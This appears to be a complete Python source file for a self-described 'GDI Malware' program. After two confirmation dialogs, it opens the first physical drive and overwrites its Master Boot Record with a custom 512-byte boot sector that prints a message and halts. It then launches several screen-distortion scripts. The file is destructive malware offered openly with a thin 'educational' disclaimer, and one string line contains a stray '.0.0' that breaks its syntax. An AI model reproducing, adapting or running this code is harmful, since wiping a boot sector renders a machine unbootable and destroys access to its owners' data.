from win32file import *  # Features CreateFileW, a function that will be used
from win32api import *   # CloseHandle, Sleep etc.
from win32gui import *   # GDI functions, unused, however always great to import
from win32con import *   # Constants like GENERIC_READ etc
from win32ui import *    # Object-oriented Windows API objects.
import sys               # Used to exit the current process. We might use ExitProcess(0), however this is more Pythonic.
import subprocess        # For running external commands as subprocesses
import ctypes            # For handling references

# Initial warning dialog to the user
title = "????? WOULD YOU LIKE TO PLAY FORBIDDEN GAMES ?????"
description = (
    "This GDI Malware was created by Zenny, if you guys like what you see from this, send me a message on discord."
    "My Discord is Zenny.Main"
    "now on to the very important information:".0.0
    "You are about to execute a severely dangerous program that overwrites the Master Boot Record "
    "of your computer. This will cause irreparable destructive consequences, and the creator is "
    "not responsible for any damage due to this being made for educational and illustrational purposes "
    "only!\n\nPress \"Yes\" to continue.\nPress \"No\" to exit."
)

# Display the first warning message box
if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
    print("No pressed")
    sys.exit(0)

# Secondary warning for additional user confirmation
title = "!! LAST WARNING !!"
description = (
    "WARNING IF YOU ACCIDENTLY RAN THIS WITHOUT KNOWING WHAT THIS DOES, CLICK NO!"
    "This is the last warning! Pressing \"Yes\" will destroy your computer, for a very long time!\n"
    "Are you sure you want to continue, resulting in an unbootable machine?!"
)

if MessageBox(description, title, MB_ICONWARNING | MB_YESNO) == IDNO:
    print("Second no pressed")
    sys.exit(0)

print("MBR overwriting...")

# Create a handle to the Master Boot Record (MBR)
hDevice = CreateFileW(
    r"\\.\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0, 0
)

# Ensure the buffer is exactly 512 bytes, with boot signature at the end
buffer = bytes([
    0xBB, 0x18, 0x7C, 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0x60, 0xB4, 0x0E, 0x8A, 0x07, 0x3C, 0x00, 0x74, 
    0x05, 0xCD, 0x10, 0x43, 0xEB, 0xF3, 0xC3, 0x61, 0x47, 0x44, 0x49, 0x20, 0x4D, 0x41, 0x4C, 0x57, 
    0x41, 0x52, 0x45, 0x20, 0x43, 0x52, 0x45, 0x41, 0x54, 0x45, 0x44, 0x20, 0x42, 0x59, 0x20, 0x5A, 
    0x45, 0x4E, 0x4E, 0x59, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA


])

# Pad the buffer to ensure it is exactly 512 bytes
buffer = buffer.ljust(512, b'\x00')

# Confirm the buffer is exactly 512 bytes
assert len(buffer) == 512, "Buffer size must be exactly 512 bytes for MBR."

# Write the boot sector data to the Master Boot Record
try:
    bytes_written, _ = WriteFile(hDevice, buffer, None)
    print(f"Wrote {bytes_written} bytes to the Master Boot Record successfully!")
except Exception as e:
    print(f"Failed to write to MBR: {e}")

# Release the memory allocated to the handle
CloseHandle(hDevice)

# Run the specified scripts concurrently
scripts = ["gditest12.py", "rasterops.py", "distort.py", "Xorfancy.py", "blur.py"]
processes = []

for script in scripts:
    try:
        print(f"Starting {script}...")
        # Use Popen to start each script concurrently
        process = subprocess.Popen(["python", script])
        processes.append(process)
    except Exception as e:
        print(f"Failed to start {script}: {e}")

# Wait for all processes to complete
for process in processes:
    process.wait()
